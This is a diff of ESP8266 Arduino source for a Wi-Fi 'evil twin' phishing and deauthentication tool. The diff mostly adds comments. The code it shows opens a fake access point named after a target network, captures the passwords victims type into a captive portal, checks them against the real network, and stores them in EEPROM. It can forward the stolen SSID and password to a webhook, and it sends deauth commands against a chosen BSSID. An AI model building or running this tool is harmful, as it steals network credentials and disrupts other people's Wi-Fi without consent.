@@ -27,18 +27,18 @@ String currentSSID; //Current SSID
 String targetSSID; //ssid of the target network
 String indexLang = "EN"; //Index Page Language(You can change the Default Language Here)
 bool validate = true; //contains if the password should be validated
-int slaveStatus = 8;
+int slaveStatus = 8; //contains the wifi status of the slave if reported
 
 DNSServer dnsServer; ESP8266WebServer webServer(80);
 SoftwareSerial esp(D1, D2);
 
-void redirect(String location){ webServer.sendHeader("Location", location, true); webServer.send(302); }
+void redirect(String location){ webServer.sendHeader("Location", location, true); webServer.send(302); } //redirection function to reduce code 
 
 void handleDashboard() { //handles the dashboard page
   int networks = WiFi.scanNetworks(false); int scanstart = millis();
   while (networks <= 1 && millis() - scanstart < 5000){ delay(125); } //ensures that the website only loads if the scan is succesfull or it times out
   
-  bool deauthing = false; if(digitalRead(D5) == 0){ deauthing = true; }
+  bool deauthing = false; if(digitalRead(D5) == 0){ deauthing = true; } //if the deauth LED of the slave is on set deauthing to true
   
   webServer.send(200, "text/html", dashboard(indexLang, favicon, targetSSID, allPass, networks, validate, deauthing, webhookUrl));
 
@@ -50,13 +50,13 @@ void handlePost(){
   String pass = webServer.arg("wifiPassword"); //Getting the value of the Password field
 
   if (validate == true){ //if validation is turned try to connect to the wifi that is beeing validated
-    esp.printf("validate|%s|%s", targetSSID.c_str(), pass.c_str());
+    esp.printf("validate|%s|%s", targetSSID.c_str(), pass.c_str()); //give the slave the command to validate the password
     Serial.printf("Connnecting to: %s, %s\n", targetSSID.c_str(), pass.c_str());
+
     String readString;
 
-    while(!esp.available()){ delay(250); }
-
-    while (esp.available()) {
+    while(!esp.available()){ delay(1); } //wait until the slave reports his wifi status
+    while (esp.available()) { //read reported wifi status
       delay(3);
       if (esp.available() > 0) {
         char c = esp.read();
@@ -72,8 +72,7 @@ void handlePost(){
     Serial.printf("Password Correct\n");
     redirect("/restarting");
 
-    if(webhookUrl != ""){ 
-      esp.printf("webhook|"); delay(100);
+    if(webhookUrl != ""){ //if webhook url is not empty therefore webhook is enabled send the command to send a webhook
       esp.printf("webhook| "); delay(100);
       esp.print(webhookUrl); delay(500);
       esp.print(targetSSID); delay(500);
@@ -81,7 +80,7 @@ void handlePost(){
     }
 
     pass = "<tr><td>" + pass + "</td><td>" + millis()/1000 + "</td></tr>"; //Adding password and seconds after bootup in a ordered list.
-    allPass += pass;                       //Updating the full passwords.
+    allPass += pass; //Updating the full passwords.
 
     for (int i = 0; i <= pass.length(); ++i){ EEPROM.write(passEnd + i, pass[i]); } //Storing passwords to EEPROM
 
@@ -108,15 +107,15 @@ void handlePostSSID() {
 
   targetSSID = postedSSID;
   postedSSID += "-Update"; //if you want to change this you have to edit the number of chars that are beeing subtracted in the setup where the target ssid is set
-  for (int i = 0; i < postedSSID.length(); ++i) { EEPROM.write(i+1, postedSSID[i]); }
+  for (int i = 0; i < postedSSID.length(); ++i) { EEPROM.write(i+1, postedSSID[i]); } //write ssid to the EEPROM
   EEPROM.write(postedSSID.length()+1, '\0');
   EEPROM.commit();
 
   redirect("/dashboard");
 
-  WiFi.softAPdisconnect(true);
+  WiFi.softAPdisconnect(true); //disable the ap
   delay(2000);
-  WiFi.softAP(postedSSID);
+  WiFi.softAP(postedSSID); //restart ap with the new ssid
   currentSSID = postedSSID;
 
   Serial.printf("SSID changed to: %s\n", currentSSID.c_str());
@@ -154,7 +153,7 @@ void handleDeauth(){ //gets the target and duration for the deauth attack and se
 
   Serial.printf("Starting to Deauth: %s(%s), on channel: %i\n", WiFi.SSID(target).c_str(), WiFi.BSSIDstr(target).c_str(), WiFi.channel(target));
   
-  esp.printf("deauth|%i|%s", WiFi.channel(target), WiFi.BSSIDstr(target).c_str());
+  esp.printf("deauth|%i|%s", WiFi.channel(target), WiFi.BSSIDstr(target).c_str()); //send the deauth command to the slave
 
   redirect("/dashboard");
   Serial.printf("=====Deauther=====\n\n");
@@ -211,7 +210,7 @@ void setup(){
   //Reading stored password and end location of passwords in the EEPROM.
   while (EEPROM.read(passEnd) != '\0') {
     allPass += char(EEPROM.read(passEnd)); //Reading the store password in EEPROM.
-    passEnd++;                             //Updating the end location of password in EEPROM.
+    passEnd++; //Updating the end location of password in EEPROM.
   }
   
   Serial.printf("WiFi mode setup: %s\n", WiFi.mode(WIFI_AP) ? "Sucessfully!" : "Failed!");
@@ -243,18 +242,14 @@ void setup(){
   webServer.begin();
 
   //Enable the built-in LED
-  pinMode(LED_BUILTIN, OUTPUT); digitalWrite(LED_BUILTIN, HIGH);
+  pinMode(LED_BUILTIN, OUTPUT); digitalWrite(LED_BUILTIN, HIGH); //enable the builtin LED
   pinMode(D5, INPUT);
 
   Serial.printf("=====Setup=====\n\n");
 }
 
 void loop(){
-  dnsServer.processNextRequest();
-  webServer.handleClient();
+  dnsServer.processNextRequest(); webServer.handleClient(); //process dns and webserver requests
 
-  while (esp.available()) {
-    delay(3);
-    Serial.write(esp.read());
-  }
+  while (esp.available()) { delay(3); Serial.write(esp.read()); } //print everything the slave send to the serial interface
 }
